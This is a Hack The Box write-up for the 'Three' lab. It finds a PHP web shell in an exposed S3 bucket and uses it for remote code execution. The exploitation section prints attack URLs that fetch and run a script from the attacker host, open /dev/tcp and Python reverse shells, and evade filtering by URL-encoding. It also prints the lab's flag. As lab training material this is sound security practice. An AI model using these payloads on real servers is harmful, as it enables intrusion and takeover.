# Three — HTB Lab

**Date**: 2025-09-09  
**Difficulty**: Easy  
**Target IP/URL**: 10.129.72.72  
**Objective**: Demonstrate basics of server-side command injection and remote code execution (RCE)

## 1. Reconnaissance
### Tools & Commands Used
- **Nmap**: Initial network scanning to identify open ports and services.
  - `qq-enum-host-nmap-top-discovery` (via Quiver, https://github.com/stevemcilwain/quiver).
  - `sudo nmap -vvv -Pn -sS -p- -sC -sV --open 10.129.72.72 -oA /home/kali/Hackthebox/three/hosts/10.129.72.72/nmap-all-discovery`
    - **Flags**: `-vvv` (verbose), `-Pn` (no ping), `-sS` (SYN scan), `-p-` (all ports), `-sC` (scripts), `-sV` (version), `--open` (show open ports), `-oA` (output all formats).

### Findings
- **22/tcp**: Open, SSH, OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0).  
  [Image Placeholder: nmap-scan]
- **80/tcp**: Open, HTTP, Apache httpd 2.4.29 (Ubuntu).  
  [Image Placeholder: nmap-scan]

## 2. Enumeration
### Tools & Commands Used
- **Gobuster**: Subdomain enumeration.
  - `gobuster vhost --append-domain -u http://thetoppers.htb/ -a "Mozilla/5.0" -t20 -k -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt | tee /home/kali/Hackthebox/three/hosts/thetoppers/gobuster-dirs-2.txt`
    - **Flags**: `vhost` (virtual host scan), `--append-domain` (append domain), `-u` (URL), `-a` (user-agent), `-t20` (20 threads), `-k` (ignore SSL errors), `-w` (wordlist), `tee` (save output).
  - [Image Placeholder: gobuster-scan]
- **AWS CLI**: S3 bucket enumeration.
  - Installed AWS CLI:
    ```bash
    curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
    unzip awscliv2.zip
    sudo ./aws/install
    aws configure
    ```
    [Image Placeholder: aws-config]
  - Listed buckets:
    ```bash
    aws --endpoint=http://s3.thetoppers.htb s3 ls
    ```
    [Image Placeholder: aws-bucket-list]
  - Listed bucket contents:
    ```bash
    aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --recursive
    ```
    [Image Placeholder: bucket-content]

### Findings
- Discovered subdomain: `s3.thetoppers.htb` (added to `/etc/hosts` with IP 10.129.72.72).
- S3 bucket `thetoppers.htb` contained files: `index.php`, `shells.php`.

## 3. Exploitation
### Vulnerability Identified
- **Vulnerability**: Remote Code Execution (RCE) via command injection in `shells.php`.
- **Details**: The file `shells.php` contained `<?php system($_GET["cmd"]); ?>`, allowing arbitrary command execution via the `cmd` URL parameter without input validation.
- **Why Vulnerable**: Lack of input sanitization enables attackers to execute system commands, leading to full server compromise.

### Exploit Steps
1. Downloaded `shells.php` from S3 bucket to analyze:
   ```bash
   aws --endpoint=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb/shells.php ./shells.php
   ```
   [Image Placeholder: shell]
2. Identified `system($_GET["cmd"])` as a web shell.
3. Started a Netcat listener:
   ```bash
   nc -lvnp 4444
   ```
4. Attempted reverse shell via URL:
   - Initial attempt (failed due to firewall or missing binaries):
     ```bash
     http://thetoppers.htb/shells.php?cmd=curl%2010.10.14.40:8000/shell.sh|bash
     ```
     [Image Placeholder: shell-runn]
   - Second attempt (failed, likely firewall blocking):
     ```bash
     http://thetoppers.htb/shells.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.40%2F4444%200%3E%261
     ```
5. Successful Python reverse shell (URL-encoded):
   ```bash
   http://thetoppers.htb/shells.php?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.40%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/bash%22)%27
   ```
   [Image Placeholder: second-shell-run]

## 4. Privilege Escalation
### Method
- Not required; initial shell provided user-level access sufficient to retrieve the flag.

### Commands & Output
- Stabilized the shell:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
- Fixed terminal issues (after `Ctrl+Z`):
  ```bash
  stty raw -echo; fg
  ```
- Navigated to user directory:
  ```bash
  ls 
  cd ..
  ls
  cat flag.txt
  ```

## 5. Post-Exploitation
- **Data Exfiltration**: None performed.
- **Persistence Method**: None established.
- **Interesting Files Found**: None noted beyond `user.txt`.

## 6. Results
- **User Flag**: ea81b7afddd03efaa0945333ed147fac  
  [Image Placeholder: flag]

## 7. Lessons Learned
### Key Takeaways
- **Reconnaissance**: Nmap revealed open ports 22 (SSH) and 80 (HTTP) running Apache 2.4.29 on Ubuntu.
- **Enumeration**: Added `thetoppers.htb` and `s3.thetoppers.htb` to `/etc/hosts` for name resolution. Gobuster with `vhost` mode found the S3 subdomain. AWS CLI revealed bucket contents (`index.php`, `shells.php`).
- **Exploitation**: Identified RCE in `shells.php`. Initial `curl` and `bash` reverse shells failed due to firewall restrictions or missing binaries. Python reverse shell succeeded after URL-encoding.
- **Shell Stabilization**: Used `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `stty raw -echo; fg` to fix terminal issues (e.g., `^M` on Enter).
- **Pentesting Tip**: For ethical hacking, always verify S3 bucket permissions and test for misconfigured web shells, as they are common vulnerabilities.

### Mistakes to Avoid
- Use `gobuster vhost` for subdomain enumeration, not `dir`.
- If a reverse shell fails, suspect firewall rules or missing binaries (e.g., `netcat`). Try alternative payloads (Python, Perl).
- URL-encode complex commands to bypass server-side filtering.
- Stabilize shells early to avoid terminal issues.

## 8. Images
- [Image Placeholder: nmap-top-scan]
- [Image Placeholder: nmap-all-scan]
- [Image Placeholder: aws-config]
- [Image Placeholder: aws-bucket-list]
- [Image Placeholder: bucket-content]
- [Image Placeholder: gobuster-scan]
- [Image Placeholder: shell]
- [Image Placeholder: shell-runn]
- [Image Placeholder: second-shell-run]
- [Image Placeholder: flag]

## 9. References
- [Gobuster](https://github.com/OJ/gobuster)
- [Auto Wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
- [Quiver](https://github.com/stevemcilwain/quiver)
- [AWS CLI](https://aws.amazon.com/cli/)